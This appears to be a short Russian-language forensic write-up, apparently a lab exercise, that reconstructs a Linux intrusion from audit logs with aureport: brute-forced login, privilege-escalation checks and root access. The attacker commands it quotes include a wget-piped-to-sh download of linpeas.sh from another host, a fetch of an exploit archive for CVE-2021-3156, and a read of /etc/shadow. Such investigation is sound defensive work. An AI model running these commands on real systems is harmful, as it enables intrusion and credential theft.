## Ход расследования и ключевые команды

### 1. Анализ первоначального доступа
Анализ логов авторизации с помощью `aureport`:
```bash
aureport -au -if audit.log

Выявлен массовый перебор паролей (разница между попытками в доли секунды), завершившийся успешным входом (success=yes) пользователя b*lo с IP 192.168.4.1*5.

2. Реконструкция действий атакующего (TTY)
Чтение команд, вводимых злоумышленником в консоли:

aureport --tty -if audit.log

Хронология действий:

Разведка окружения (whoami, sudo -l).

Скачивание и запуск скрипта сканирования: wget -O - http://192.168.4.155:8000/linpeas.sh | sh.

Проверка версии Sudo: sudo -V (выявление уязвимости CVE-2021-3156).

Загрузка исходников эксплойта: wget http://192.168.4.155:8000/evil.tar.gz.

Компиляция и запуск бинарника: ./evil 0.

Чтение конфиденциальных данных после получения Root: cat /etc/shadow.
